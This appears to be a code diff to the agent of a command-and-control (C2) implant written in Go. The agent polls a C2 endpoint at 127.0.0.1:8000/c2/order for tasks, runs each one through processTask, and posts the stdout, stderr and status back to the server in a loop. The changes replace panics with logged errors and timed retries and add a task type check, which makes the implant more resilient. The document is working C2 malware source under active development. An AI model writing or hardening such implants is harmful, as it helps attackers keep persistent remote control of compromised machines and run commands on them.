@@ -108,7 +108,6 @@ func processTask(task map[string]interface{}) (string, string, int, error) {
    la requete POST permet d'envoyer les resultats des taches traitees
 
 */
-
 func runAgent() {
 	fmt.Println("Defined variables")
 	var (
@@ -130,7 +129,8 @@ func runAgent() {
 	jsonData := []byte(`{"data":"{}"}`)
 	req, err := http.NewRequest("GET", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
 	if err != nil {
-		panic(err)
+		fmt.Println("Error creating request:", err)
+		return
 	}
 
 	for key, value := range headers {
@@ -139,14 +139,16 @@ func runAgent() {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error sending request:", err)
+		return
 	}
 
 	defer resp.Body.Close()
 
 	content, err = ioutil.ReadAll(resp.Body)
 	if err != nil {
-		panic(err)
+		fmt.Println("Error reading response body:", err)
+		return
 	}
 
 	fmt.Println("Get content response 1")
@@ -155,7 +157,9 @@ func runAgent() {
 		var order map[string]interface{}
 		err = json.Unmarshal(content, &order)
 		if err != nil {
-			panic(err)
+			fmt.Println("Error decoding JSON response:", err)
+			time.Sleep(5 * time.Second)
+			continue
 		}
 
 		var body []map[string]interface{}
@@ -164,14 +168,22 @@ func runAgent() {
 
 		for _, task := range order["Tasks"].([]interface{}) {
 			fmt.Println("Process task")
-			taskStdout, taskStderr, taskStatus, err = processTask(task.(map[string]interface{}))
-			if err != nil {
+			taskMap, ok := task.(map[string]interface{})
+			if !ok {
+				fmt.Println("Task is not a map[string]interface{}")
 				taskStatus = 1
-				taskStderr = err.Error()
+				taskStderr = "Invalid task format"
+			} else {
+				taskStdout, taskStderr, taskStatus, err = processTask(taskMap)
+				if err != nil {
+					taskStatus = 1
+					taskStderr = err.Error()
+				}
 			}
+
 			fmt.Println("body add task result")
 			body = append(body, map[string]interface{}{
-				"id":     task.(map[string]interface{})[" id"],
+				"id":     taskMap["id"],
 				"stdout": taskStdout,
 				"stderr": taskStderr,
 				"status": taskStatus,
@@ -183,12 +195,16 @@ func runAgent() {
 			"tasks": body,
 		})
 		if err != nil {
-			panic(err)
+			fmt.Println("Error encoding JSON payload:", err)
+			time.Sleep(5 * time.Second)
+			continue
 		}
 
 		req, err = http.NewRequest("POST", "http://127.0.0.1:8000/c2/order/01223456789abcdef", bytes.NewBuffer(jsonData))
 		if err != nil {
-			panic(err)
+			fmt.Println("Error creating request:", err)
+			time.Sleep(5 * time.Second)
+			continue
 		}
 
 		for key, value := range headers {
@@ -197,19 +213,19 @@ func runAgent() {
 
 		resp, err = client.Do(req)
 		if err != nil {
-			panic(err)
+			fmt.Println("Error sending request:", err)
+			time.Sleep(5 * time.Second)
+			continue
 		}
 
 		defer resp.Body.Close()
 
 		content, err = ioutil.ReadAll(resp.Body)
 		if err != nil {
-			panic(err)
+			fmt.Println("Error reading response body:", err)
+			time.Sleep(5 * time.Second)
+			continue
 		}
-
-		fmt.Println("Get content response 2")
-
-		time.Sleep(5 * time.Second)
 	}
 }
 
